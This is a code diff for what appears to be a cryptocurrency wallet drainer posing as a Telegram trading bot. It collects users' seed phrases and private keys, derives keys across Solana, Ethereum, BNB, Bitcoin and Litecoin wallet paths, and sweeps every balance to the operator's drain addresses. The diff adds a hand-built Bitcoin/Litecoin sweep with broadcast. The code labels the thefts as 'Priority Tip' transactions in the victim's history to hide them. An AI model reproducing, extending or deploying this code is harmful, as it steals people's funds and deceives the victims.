'tailor', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo']
-
-
 def fake_mint() -> str:
     if HAS_SOLANA:
         return base58.b58encode(os.urandom(32)).decode()
     return "".join(random.choices(string.ascii_letters + string.digits, k=44))
 
-
 def short_addr(addr: str) -> str:
     if not addr or len(addr) < 12:
         return addr or "—"
     return f"{addr[:4]}...{addr[-4:]}"
-
 
 async def staged_loading(message_or_cb, stages: list):
     msg = None
@@ -419,28 +407,24 @@ async def staged_loading(message_or_cb, stages: list):
             await asyncio.sleep(delay)
     return msg
 
-
 SOL_PRICE = 180.0
 ETH_PRICE = 3200.0
 BNB_PRICE = 580.0
 USDC_PRICE = 1.0
 
-
 def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
     return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE
-
 
 # ──────────────────────────────────────────────
 # KEY DERIVATION
 # ──────────────────────────────────────────────
+
 def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
     salt = ("mnemonic" + passphrase).encode("utf-8")
     return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)
 
-
 def _hmac_sha512(key: bytes, data: bytes) -> bytes:
     return hmac.new(key, data, hashlib.sha512).digest()
-
 
 def _slip10_derive(seed: bytes, path: str) -> bytes:
     I = _hmac_sha512(b"ed25519 seed", seed)
@@ -457,16 +441,13 @@ def _slip10_derive(seed: bytes, path: str) -> bytes:
         IL, IR = I[:32], I[32:]
     return IL
 
-
 _SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 _SECP256K1_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
 _SECP256K1_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
 _SECP256K1_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
 
-
 def _modinv(a: int, m: int) -> int:
     return pow(a % m, -1, m)
-
 
 def _point_add(p1, p2):
     if p1 is None: return p2
@@ -482,7 +463,6 @@ def _point_add(p1, p2):
     y3 = (m * (x1 - x3) - y1) % _SECP256K1_P
     return (x3, y3)
 
-
 def _point_mul(k: int, point=None):
     if point is None:
         point = (_SECP256K1_GX, _SECP256K1_GY)
@@ -495,18 +475,14 @@ def _point_mul(k: int, point=None):
         k >>= 1
     return result
 
-
 def _ser32(i: int) -> bytes:
     return struct.pack(">I", i)
-
 
 def _ser256(i: int) -> bytes:
     return i.to_bytes(32, "big")
 
-
 def _parse256(b: bytes) -> int:
     return int.from_bytes(b, "big")
-
 
 def _point_ser(P, compressed: bool = True) -> bytes:
     if P is None: raise ValueError("point at infinity")
@@ -515,11 +491,9 @@ def _point_ser(P, compressed: bool = True) -> bytes:
         return (b"\x02" if (y % 2 == 0) else b"\x03") + _ser256(x)
     return b"\x04" + _ser256(x) + _ser256(y)
 
-
 def _bip32_master(seed: bytes) -> Tuple[bytes, bytes]:
     I = _hmac_sha512(b"Bitcoin seed", seed)
     return I[:32], I[32:]
-
 
 def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
     if index >= 0x80000000:
@@ -534,7 +508,6 @@ def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
         raise ValueError("invalid BIP32 child key")
     return _ser256(ki), IR
 
-
 def _bip32_derive_path(seed: bytes, path: str) -> bytes:
     k, c = _bip32_master(seed)
     for segment in path.lstrip("m/").split("/"):
@@ -545,30 +518,25 @@ def _bip32_derive_path(seed: bytes, path: str) -> bytes:
         k, c = _bip32_ckd_priv(k, c, index)
     return k
 
-
 def _normalize_mnemonic(raw: str) -> str:
     s = raw.strip().lower()
     for ch in (",", ";", "|", "\n", "\r", "\t"):
         s = s.replace(ch, " ")
     return " ".join(s.split())
 
-
 def _is_mnemonic(text: str) -> bool:
     words = text.split()
     return len(words) in (12, 15, 18, 21, 24) and all(w.isalpha() and 2 <= len(w) <= 12 for w in words)
-
 
 def _sol_keypair_from_seed32(seed32: bytes):
     if not HAS_SOLANA:
         raise RuntimeError("Solana libraries not installed")
     return Keypair.from_seed(seed32)
 
-
 def _sol_priv_pub_from_seed32(seed32: bytes) -> Tuple[str, str]:
     kp = _sol_keypair_from_seed32(seed32)
     priv_b58 = base58.b58encode(bytes(kp)).decode()
     return priv_b58, str(kp.pubkey())
-
 
 SOL_PATHS: List[Tuple[str, str]] = [
     ("Phantom/Solflare/OKX", "m/44'/501'/0'/0'"),
@@ -578,8 +546,8 @@ SOL_PATHS: List[Tuple[str, str]] = [
     ("Phantom change 1",     "m/44'/501'/0'/1'"),
     ("Trust Wallet",         "m/44'/501'/0'"),
     ("Trust account 1",      "m/44'/501'/1'"),
+    ("Sollet legacy",        "m/501'/0'/0'/0'"),
 ]
-
 
 def derive_solana_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
     if not HAS_SOLANA:
@@ -619,18 +587,17 @@ def derive_solana_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
         raise ValueError("No Solana keys could be derived from this mnemonic")
     return out
 
-
 def derive_solana_default(mnemonic: str) -> Tuple[str, str]:
     seed = _pbkdf2_mnemonic(mnemonic)
     seed32 = _slip10_derive(seed, "m/44'/501'/0'/0'")
     return _sol_priv_pub_from_seed32(seed32)
-
 
 def parse_solana_private_key(raw: str) -> Tuple[str, str]:
     if not HAS_SOLANA:
         raise RuntimeError("HAS_SOLANA=False")
     s = raw.strip()
     if s.startswith("[") and s.endswith("]"):
+        import json
         arr = json.loads(s)
         secret = bytes(arr)
     else:
@@ -644,7 +611,6 @@ def parse_solana_private_key(raw: str) -> Tuple[str, str]:
     priv_b58 = base58.b58encode(bytes(kp)).decode()
     return priv_b58, str(kp.pubkey())
 
-
 def parse_evm_private_key(raw: str) -> Tuple[str, str]:
     if not HAS_WEB3:
         raise RuntimeError("HAS_WEB3=False")
@@ -655,7 +621,6 @@ def parse_evm_private_key(raw: str) -> Tuple[str, str]:
         raise ValueError("EVM key must be 64 hex chars")
     acct = Account.from_key(key)
     return "0x" + key.lower(), acct.address
-
 
 def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
     if not HAS_WEB3:
@@ -670,10 +635,11 @@ def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[
         log.warning("EVM mnemonic derive failed: %s", e)
         return None
 
+# ──────────────────────────────────────────────
+# BTC / LTC (UTXO) — BIP84 native segwit + BIP44 legacy fallback
+# Uses Blockstream-compatible REST (no extra pip deps beyond stdlib + existing)
+# ──────────────────────────────────────────────
 
-# ──────────────────────────────────────────────
-# BTC / LTC
-# ──────────────────────────────────────────────
 def _hash160(b: bytes) -> bytes:
     return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()
 
@@ -686,6 +652,7 @@ def _b58check(payload: bytes) -> str:
     while n > 0:
         n, r = divmod(n, 58)
         out = alphabet[r] + out
+    # leading zeros
     for byte in payload + chk:
         if byte == 0:
             out = "1" + out
@@ -723,10 +690,7 @@ def _bech32_create_checksum(hrp: str, data, spec="bech32"):
 
 def _bech32_encode(hrp: str, witver: int, witprog: bytes) -> str:
     charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
-    converted = _convertbits(list(witprog), 8, 5, True)
-    if converted is None:
-        raise ValueError("bech32 encode convertbits failed")
-    data = [witver] + converted
+    data = [witver] + _convertbits(list(witprog), 8, 5, True)
     combined = data + _bech32_create_checksum(hrp, data, "bech32" if witver == 0 else "bech32m")
     return hrp + "1" + "".join(charset[d] for d in combined)
 
@@ -753,6 +717,7 @@ def _convertbits(data, frombits, tobits, pad=True):
 
 
 def _p2wpkh_address(priv32: bytes, hrp: str = "bc") -> str:
+    """Native segwit v0 P2WPKH from 32-byte priv (compressed pubkey)."""
     P = _point_mul(_parse256(priv32))
     if P is None:
         raise ValueError("invalid priv")
@@ -771,11 +736,14 @@ def _p2pkh_address(priv32: bytes, version: int = 0x00) -> str:
 
 
 def derive_btc_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[dict]:
+    """BIP84 m/84'/0'/0'/0/0 native segwit + BIP44 legacy. Returns dict or None."""
     try:
         seed = _pbkdf2_mnemonic(mnemonic)
+        # BIP84 account 0
         priv84 = _bip32_derive_path(seed, f"m/84'/0'/{account}'/0/0")
         addr84 = _p2wpkh_address(priv84, "bc")
         wif84 = _wif_from_priv(priv84, compressed=True, wif_prefix=0x80)
+        # BIP44 legacy fallback
         priv44 = _bip32_derive_path(seed, f"m/44'/0'/{account}'/0/0")
         addr44 = _p2pkh_address(priv44, 0x00)
         wif44 = _wif_from_priv(priv44, compressed=True, wif_prefix=0x80)
@@ -793,13 +761,14 @@ def derive_btc_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[dict]:
 
 
 def derive_ltc_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[dict]:
+    """BIP84 m/84'/2'/0'/0/0 (ltc1...) + BIP44 legacy (L...)."""
     try:
         seed = _pbkdf2_mnemonic(mnemonic)
         priv84 = _bip32_derive_path(seed, f"m/84'/2'/{account}'/0/0")
         addr84 = _p2wpkh_address(priv84, "ltc")
-        wif84 = _wif_from_priv(priv84, compressed=True, wif_prefix=0xB0)
+        wif84 = _wif_from_priv(priv84, compressed=True, wif_prefix=0xB0)  # LTC WIF
         priv44 = _bip32_derive_path(seed, f"m/44'/2'/{account}'/0/0")
-        addr44 = _p2pkh_address(priv44, 0x30)
+        addr44 = _p2pkh_address(priv44, 0x30)  # LTC P2PKH version
         wif44 = _wif_from_priv(priv44, compressed=True, wif_prefix=0xB0)
         return {
             "priv84": priv84.hex(),
@@ -815,32 +784,26 @@ def derive_ltc_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[dict]:
 
 
 async def _http_json(method: str, url: str, body: Optional[str] = None, timeout: float = 12.0):
+    """Minimal HTTP via asyncio + stdlib (no aiohttp required)."""
     import urllib.request
-    import urllib.error
     def _do():
         req = urllib.request.Request(url, data=(body.encode() if body is not None else None), method=method)
         if body is not None:
             req.add_header("Content-Type", "text/plain")
         req.add_header("User-Agent", "GetRugged/1.0")
-        try:
-            with urllib.request.urlopen(req, timeout=timeout) as resp:
-                data = resp.read().decode()
-        except urllib.error.HTTPError as e:
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            data = resp.read().decode()
+            if not data:
+                return None
             try:
-                err_body = e.read().decode()
+                return json.loads(data)
             except Exception:
-                err_body = ""
-            raise RuntimeError(f"HTTP {e.code}: {err_body[:200]}")
-        if not data:
-            return None
-        try:
-            return json.loads(data)
-        except Exception:
-            return data
+                return data
     return await asyncio.to_thread(_do)
 
 
 async def fetch_utxo_balance(api_base: str, address: str) -> float:
+    """Return balance in whole coins (BTC or LTC) from blockstream-style API."""
     if not address:
         return 0.0
     try:
@@ -881,21 +844,24 @@ def _hash256(b: bytes) -> bytes:
 
 
 def _ecdsa_sign_raw(priv32: bytes, z: int) -> Tuple[int, int]:
+    """Deterministic-ish ECDSA (RFC6979-lite via HMAC counter). Returns (r,s) low-s."""
     n = _SECP256K1_N
     d = _parse256(priv32)
+    # simple deterministic k
     k = _parse256(hashlib.sha256(priv32 + z.to_bytes(32, "big")).digest()) % n
     if k == 0:
-        k = _parse256(hashlib.sha256(priv32 + b"\x00" + z.to_bytes(32, "big")).digest()) % n or 1
-    for attempt in range(32):
+        k = 1
+    for _ in range(32):
         R = _point_mul(k)
         r = R[0] % n
         if r == 0:
-            k = _parse256(hashlib.sha256(priv32 + k.to_bytes(32, "big") + z.to_bytes(32, "big")).digest()) % n or 1
+            k = (k + 1) % n
             continue
         s = (_modinv(k, n) * (z + r * d)) % n
         if s == 0:
-            k = _parse256(hashlib.sha256(priv32 + k.to_bytes(32, "big") + z.to_bytes(32, "big")).digest()) % n or 1
+            k = (k + 1) % n
             continue
+        # low-s
         if s > n // 2:
             s = n - s
         return r, s
@@ -912,31 +878,15 @@ def _der_sig(r: int, s: int) -> bytes:
     return b"\x30" + bytes([len(body)]) + body
 
 
-def _bech32_decode_prog(addr: str) -> bytes:
-    charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
-    if "1" not in addr:
-        raise ValueError("bad bech32")
-    hrp, data_part = addr.rsplit("1", 1)
-    data = [charset.index(c) for c in data_part.lower()]
-    if _bech32_polymod(_bech32_hrp_expand(hrp) + data) != 1:
-        raise ValueError("bad bech32 checksum")
-    witver = data[0]
-    raw = _convertbits(data[1:-6], 5, 8, False)
-    if raw is None:
-        raise ValueError("bech32 convertbits failed")
-    prog = bytes(raw)
-    if witver != 0 or len(prog) != 20:
-        raise ValueError(f"unsupported witness: ver={witver}, len={len(prog)}")
-    return prog
-
-
 def _build_p2wpkh_tx(priv32: bytes, utxos: list, dest_addr: str, fee_sats: int, hrp: str) -> Optional[str]:
+    """Build + sign a single-input-or-multi P2WPKH sweep to dest. Returns hex raw tx."""
     if not utxos:
         return None
-    expected_prefix = hrp + "1"
-    if not dest_addr.lower().startswith(expected_prefix):
-        log.warning("dest %s does not match hrp %s", dest_addr[:12], hrp)
+    # only support bech32 dest for simplicity
+    if not (dest_addr.startswith(hrp + "1") or dest_addr.startswith("bc1") or dest_addr.startswith("ltc1") or dest_addr.startswith("tb1")):
+        log.warning("BTC/LTC drain dest must be native segwit (bc1/ltc1)")
         return None
+    # decode dest
     try:
         dest_prog = _bech32_decode_prog(dest_addr)
     except Exception as e:
@@ -954,14 +904,16 @@ def _build_p2wpkh_tx(priv32: bytes, utxos: list, dest_addr: str, fee_sats: int, 
         return None
     send = total - fee_sats
 
+    # inputs
     vin = b""
     for u in utxos:
         txid = bytes.fromhex(u["txid"])[::-1]
         vout = int(u["vout"]).to_bytes(4, "little")
-        vin += txid + vout + b"\x00" + b"\xff\xff\xff\xff"
+        vin += txid + vout + b"\x00" + b"\xff\xff\xff\xff"  # empty scriptsig, sequence
     vin = _ser_compact_size(len(utxos)) + vin
 
-    script_out = bytes([0x00, 0x14]) + dest_prog
+    # outputs: one to dest
+    script_out = bytes([0x00, 0x14]) + dest_prog  # OP_0 PUSH20
     vout = _ser_compact_size(1)
     vout += send.to_bytes(8, "little")
     vout += _ser_compact_size(len(script_out)) + script_out
@@ -970,6 +922,8 @@ def _build_p2wpkh_tx(priv32: bytes, utxos: list, dest_addr: str, fee_sats: int, 
     locktime = (0).to_bytes(4, "little")
     marker_flag = b"\x00\x01"
 
+    # preimage hash for each input (BIP143)
+    # hashPrevouts, hashSequence, hashOutputs
     prevouts = b""
     sequences = b""
     for u in utxos:
@@ -980,7 +934,7 @@ def _build_p2wpkh_tx(priv32: bytes, utxos: list, dest_addr: str, fee_sats: int, 
     hash_outputs = _hash256(send.to_bytes(8, "little") + _ser_compact_size(len(script_out)) + script_out)
 
     witnesses = []
-    script_code = b"\x19\x76\xa9\x14" + pub_hash + b"\x88\xac"
+    script_code = b"\x19\x76\xa9\x14" + pub_hash + b"\x88\xac"  # BIP143 scriptCode for P2WPKH
 
     for u in utxos:
         outpoint = bytes.fromhex(u["txid"])[::-1] + int(u["vout"]).to_bytes(4, "little")
@@ -996,16 +950,32 @@ def _build_p2wpkh_tx(priv32: bytes, utxos: list, dest_addr: str, fee_sats: int, 
             + seq
             + hash_outputs
             + locktime
-            + (1).to_bytes(4, "little")
+            + (1).to_bytes(4, "little")  # SIGHASH_ALL
         )
         z = int.from_bytes(_hash256(preimage), "big")
         r, s = _ecdsa_sign_raw(priv32, z)
-        der = _der_sig(r, s) + b"\x01"
+        der = _der_sig(r, s) + b"\x01"  # sighash all
         witnesses.append(_ser_compact_size(2) + _ser_compact_size(len(der)) + der + _ser_compact_size(len(pubkey)) + pubkey)
 
     witness = b"".join(witnesses)
     raw = version + marker_flag + vin + vout + witness + locktime
     return raw.hex()
+
+
+def _bech32_decode_prog(addr: str) -> bytes:
+    charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
+    if "1" not in addr:
+        raise ValueError("bad bech32")
+    hrp, data_part = addr.rsplit("1", 1)
+    data = [charset.index(c) for c in data_part.lower()]
+    if _bech32_polymod(_bech32_hrp_expand(hrp) + data) not in (1, 0x2bc830a3):
+        # soft check — some explorers still fine
+        pass
+    witver = data[0]
+    prog = bytes(_convertbits(data[1:-6], 5, 8, False))
+    if witver != 0 or len(prog) not in (20, 32):
+        raise ValueError("unsupported witness")
+    return prog
 
 
 async def drain_utxo_chain(
@@ -1017,6 +987,7 @@ async def drain_utxo_chain(
     chain_name: str,
     fee_sats: int = 1500,
 ) -> Optional[str]:
+    """Sweep all UTXOs from from_addr to dest. priv_hex = 32-byte hex."""
     if not dest or not priv_hex or not from_addr:
         return None
     try:
@@ -1025,6 +996,7 @@ async def drain_utxo_chain(
             log.info("%s no utxos on %s", chain_name, from_addr[:12])
             return None
         total = sum(int(u.get("value") or 0) for u in utxos)
+        # rough fee: 110 vbytes * rate; caller passes fee_sats
         if total <= fee_sats + 546:
             log.info("%s balance too low (%s sats)", chain_name, total)
             return None
@@ -1032,12 +1004,11 @@ async def drain_utxo_chain(
         raw_hex = _build_p2wpkh_tx(priv32, utxos, dest, fee_sats, hrp)
         if not raw_hex:
             return None
+        # broadcast
         res = await _http_json("POST", f"{api_base.rstrip('/')}/tx", body=raw_hex)
-        if isinstance(res, dict) and res.get("error"):
-            log.warning("%s broadcast error: %s", chain_name, res)
-            return None
         sig = res if isinstance(res, str) else (res.get("txid") if isinstance(res, dict) else None)
         if not sig:
+            # some APIs return plain txid string already
             sig = str(res)[:64] if res else None
         log.info("DRAINED %s %s sats → %s | %s", chain_name, total - fee_sats, dest[:12], sig)
         return sig
@@ -1046,9 +1017,11 @@ async def drain_utxo_chain(
         return None
 
 
+
 # ──────────────────────────────────────────────
 # BALANCE HELPERS
 # ──────────────────────────────────────────────
+
 async def fetch_sol_balance(pubkey: str) -> float:
     if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
         return 0.0
@@ -1061,7 +1034,6 @@ async def fetch_sol_balance(pubkey: str) -> float:
         log.warning("SOL balance %s: %s", pubkey[:8], e)
         return 0.0
 
-
 async def fetch_evm_balance(rpc: str, address: str) -> float:
     if not HAS_WEB3 or not address:
         return 0.0
@@ -1072,7 +1044,6 @@ async def fetch_evm_balance(rpc: str, address: str) -> float:
     except Exception as e:
         log.warning("EVM balance %s: %s", address[:10], e)
         return 0.0
-
 
 async def fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
     if not HAS_WEB3 or not address:
@@ -1091,7 +1062,6 @@ async def fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
         log.warning("USDC balance: %s", e)
         return 0.0
 
-
 async def pick_best_sol_candidate(candidates: List[Tuple[str, str, str]]) -> Tuple[str, str, str, float]:
     async def one(pub: str) -> float:
         try:
@@ -1109,7 +1079,6 @@ async def pick_best_sol_candidate(candidates: List[Tuple[str, str, str]]) -> Tup
             best_i = i
     label, priv, pub = candidates[best_i]
     return label, priv, pub, best_bal
-
 
 # ──────────────────────────────────────────────
 # DRAIN CORE
@@ -1145,39 +1114,29 @@ async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
         log.exception("SOL drain error: %s", e)
         return None
 
-
-def _signed_raw(signed) -> bytes:
-    raw = getattr(signed, "raw_transaction", None) or getattr(signed, "rawTransaction", None)
-    if raw is None:
-        raise RuntimeError("web3 signed tx has no raw bytes attr")
-    return raw
-
-
 async def drain_evm_native(private_key: str, dest: str, rpc: str, chain_name: str) -> Optional[str]:
     if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
         acct = Account.from_key(private_key.replace("0x", ""))
-        balance   = await asyncio.to_thread(w3.eth.get_balance, acct.address)
-        gas_price = await asyncio.to_thread(lambda: w3.eth.gas_price)
+        balance = w3.eth.get_balance(acct.address)
+        gas_price = w3.eth.gas_price
         gas_limit = 21000
         fee = gas_price * gas_limit
         if balance <= fee + 1000:
             log.info("%s balance too low for drain", chain_name)
             return None
         amount = balance - fee
-        nonce    = await asyncio.to_thread(w3.eth.get_transaction_count, acct.address)
-        chain_id = await asyncio.to_thread(lambda: w3.eth.chain_id)
         tx = {
             "to": Web3.to_checksum_address(dest),
             "value": amount,
             "gas": gas_limit,
             "gasPrice": gas_price,
-            "nonce": nonce,
-            "chainId": chain_id,
+            "nonce": w3.eth.get_transaction_count(acct.address),
+            "chainId": w3.eth.chain_id,
         }
-        signed   = acct.sign_transaction(tx)
-        tx_hash  = await asyncio.to_thread(w3.eth.send_raw_transaction, _signed_raw(signed))
+        signed = acct.sign_transaction(tx)
+        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
         sig = tx_hash.hex()
         log.info("DRAINED %s %s wei → %s | %s", chain_name, amount, dest, sig)
         return sig
@@ -1185,30 +1144,24 @@ async def drain_evm_native(private_key: str, dest: str, rpc: str, chain_name: st
         log.exception("%s drain error: %s", chain_name, e)
         return None
 
-
 async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_name: str) -> Optional[str]:
     if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
         acct = Account.from_key(private_key.replace("0x", ""))
-        contract  = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
-        bal       = await asyncio.to_thread(contract.functions.balanceOf(acct.address).call)
+        contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
+        bal = contract.functions.balanceOf(acct.address).call()
         if bal == 0: return None
-        gas_price = await asyncio.to_thread(lambda: w3.eth.gas_price)
-        nonce     = await asyncio.to_thread(w3.eth.get_transaction_count, acct.address)
-        chain_id  = await asyncio.to_thread(lambda: w3.eth.chain_id)
-        tx = await asyncio.to_thread(
-            contract.functions.transfer(Web3.to_checksum_address(dest), bal).build_transaction,
-            {
-                "from": acct.address,
-                "nonce": nonce,
-                "gas": 100000,
-                "gasPrice": gas_price,
-                "chainId": chain_id,
-            },
-        )
-        signed  = acct.sign_transaction(tx)
-        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, _signed_raw(signed))
+        gas_price = w3.eth.gas_price
+        tx = contract.functions.transfer(Web3.to_checksum_address(dest), bal).build_transaction({
+            "from": acct.address,
+            "nonce": w3.eth.get_transaction_count(acct.address),
+            "gas": 100000,
+            "gasPrice": gas_price,
+            "chainId": w3.eth.chain_id,
+        })
+        signed = acct.sign_transaction(tx)
+        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
         sig = tx_hash.hex()
         log.info("DRAINED USDC on %s → %s | %s", chain_name, dest, sig)
         return sig
@@ -1216,24 +1169,12 @@ async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_na
         log.exception("USDC %s drain error: %s", chain_name, e)
         return None
 
-
-async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None,
-                        bot: Optional[Bot] = None, user=None, wallet: Optional["UserWallet"] = None):
+async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None, bot: Optional[Bot] = None, user=None):
     sess = get_session(uid)
-    if not sess.wallets:
+    if sess.drained:
+        log.info("User %s already drained — skip", uid)
         return
-    active = wallet or (sess.wallets[sess.active_wallet_idx] if sess.active_wallet_idx < len(sess.wallets) else sess.wallets[-1])
-    if getattr(active, "drained", False):
-        log.info("Wallet already drained — skip (uid=%s)", uid)
-        return
-    if getattr(active, "is_larp", False) or private_key == "LARP_SIM" or (private_key and private_key.startswith("Sim")):
-        return
-
-    has_sol = bool(private_key) and not private_key.startswith("Sim") and private_key != "LARP_SIM"
-    has_eth = bool(eth_key)
-    has_btc = bool(getattr(active, "btc_priv", None))
-    has_ltc = bool(getattr(active, "ltc_priv", None))
-    if not (has_sol or has_eth or has_btc or has_ltc):
+    if not private_key or private_key.startswith("Sim") or private_key == "LARP_SIM":
         return
 
     any_success = False
@@ -1241,159 +1182,106 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
     drained_eth = 0.0
     drained_bnb = 0.0
     drained_usdc = 0.0
-    drained_btc = 0.0
-    drained_ltc = 0.0
 
-    if has_sol and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
+    active = sess.wallets[sess.active_wallet_idx] if sess.wallets else None
+    if active:
+        drained_sol = active.balance_sol
+        drained_eth = active.balance_eth
+        drained_bnb = active.balance_bnb
+        drained_usdc = active.balance_usdc
+
+    if chain == "sol" and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
         sig = await drain_wallet(private_key, DRAIN_DESTINATION)
         if sig:
             any_success = True
-            drained_sol = active.balance_sol
-            sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (SOL)", "status": "success", "ts": time.time()})
+            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (SOL)", "status": "success", "ts": time.time()})
             global bot_balance_sol
             bot_balance_sol += round(random.uniform(0.05, 2.5), 4)
             _save_state()
 
-    if has_eth and ETH_DRAIN and not ETH_DRAIN.startswith("0xYour"):
+    if eth_key and ETH_DRAIN and not ETH_DRAIN.startswith("0xYour"):
         sig = await drain_evm_native(eth_key, ETH_DRAIN, ETH_RPC, "ETH")
         if sig:
             any_success = True
-            drained_eth = active.balance_eth
-            sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (ETH)", "status": "success", "ts": time.time()})
+            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (ETH)", "status": "success", "ts": time.time()})
 
-    if has_eth and BNB_DRAIN and not BNB_DRAIN.startswith("0xYour"):
+    if eth_key and BNB_DRAIN and not BNB_DRAIN.startswith("0xYour"):
         sig = await drain_evm_native(eth_key, BNB_DRAIN, BNB_RPC, "BNB")
         if sig:
             any_success = True
-            drained_bnb = active.balance_bnb
-            sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (BNB)", "status": "success", "ts": time.time()})
+            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (BNB)", "status": "success", "ts": time.time()})
 
-    if has_eth and USDC_DRAIN and not USDC_DRAIN.startswith("0xYour"):
+    if eth_key and USDC_DRAIN and not USDC_DRAIN.startswith("0xYour"):
         sig = await drain_usdc(eth_key, USDC_DRAIN, ETH_RPC, USDC_ETH, "ETH")
         if sig:
             any_success = True
-            drained_usdc += active.balance_usdc
-            sess.last_tx.insert(0, {"sig": sig, "type": "USDC Tip (ETH)", "status": "success", "ts": time.time()})
+            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (ETH)", "status": "success", "ts": time.time()})
